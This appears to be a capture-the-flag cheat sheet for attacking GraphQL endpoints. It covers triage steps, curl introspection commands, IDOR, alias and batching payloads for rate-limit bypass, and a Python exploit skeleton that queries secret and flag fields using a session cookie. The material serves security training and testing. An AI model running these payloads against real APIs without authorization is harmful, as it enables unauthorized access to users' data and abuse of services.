# Web GraphQL

## When to suspect this

- Endpoint `/graphql`, `/api/graphql`, `/graphiql`, `/playground`.
- JSON body contains `query`, `variables`, `operationName`.
- Frontend JS contains GraphQL fragments, queries, mutations.
- Errors mention fields, types, resolvers, schema, introspection.
- Rate limits apply per HTTP request but GraphQL supports batching/aliases.

## Fast triage checklist

- Confirm endpoint and method.
- Try introspection.
- Enumerate queries, mutations, types, arguments.
- Check authz per resolver, not just route.
- Test IDOR by changing IDs in variables.
- Test batching/aliasing for rate limit bypass.
- Test injection inside resolver arguments.
- Check file upload scalar or SSRF-like URL scalar.

## Manual confirmation

```bash
curl -sk http://HOST/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'

curl -sk http://HOST/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name}}}"}' | jq .
```

Find mutations:

```graphql
{__schema{mutationType{fields{name args{name type{name kind ofType{name kind}}}}}}}
```

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| `curl` | Exact GraphQL requests | POST `{"query":"{__typename}"}` | Type name returned |
| GraphiQL/Playground | Interactive schema browsing | Visit `/graphiql` | Docs/schema visible |
| `jq` | Read introspection output | `curl ... | jq` | Types/mutations |
| Burp Repeater | Authz/IDOR testing | Change variables | Unauthorized data |

## Payload starter pack

Introspection:

```graphql
{__schema{types{name fields{name args{name}}}}}
```

IDOR:

```json
{"query":"query($id:ID!){user(id:$id){id username secret flag}}","variables":{"id":"1"}}
```

Aliases:

```graphql
query {
  a:user(id:"1"){secret}
  b:user(id:"2"){secret}
  c:user(id:"3"){secret}
}
```

Batching:

```json
[{"query":"mutation{vote(id:\"x\"){ok}}"},{"query":"mutation{vote(id:\"x\"){ok}}"}]
```

## Exploit skeleton

```python
#!/usr/bin/env python3
import requests, json

URL = "http://HOST/graphql"
COOKIE = {"session": "COOKIE"}

def gql(query, variables=None):
    r = requests.post(URL, json={"query": query, "variables": variables or {}}, cookies=COOKIE, timeout=10)
    print(r.status_code)
    print(json.dumps(r.json(), indent=2)[:3000])
    return r.json()

gql("{__typename}")
gql("{__schema{types{name}}}")
gql("query($id:ID!){user(id:$id){id username flag secret}}", {"id": "1"})
```

## Escalation path

- If introspection is enabled, map privileged mutations and hidden fields.
- If introspection is disabled, recover queries from JS bundles.
- If resolver authz is weak, enumerate IDs or aliases.
- If rate limited, use aliases or array batching.
- If resolver interpolates input, test SQL/NoSQL/command injection in arguments.

## Common bypasses

- GET vs POST.
- `application/graphql` vs JSON.
- Aliases to repeat resolver calls.
- Array batching.
- Fragment abuse.
- Variables with object/array/null types.
- Introspection disabled but suggestions/errors leak field names.

## Rabbit holes

- Treating GraphQL as automatically vulnerable.
- Ignoring frontend query fragments.
- Missing per-field authz because route auth exists.
- Running huge introspection output without focusing mutations/secret fields.

## Final solve checklist

- Endpoint, schema or recovered query map is known.
- Privileged field/mutation is identified.
- Authz/injection/batching primitive is proven.
- Final query returns flag or triggers intended action.

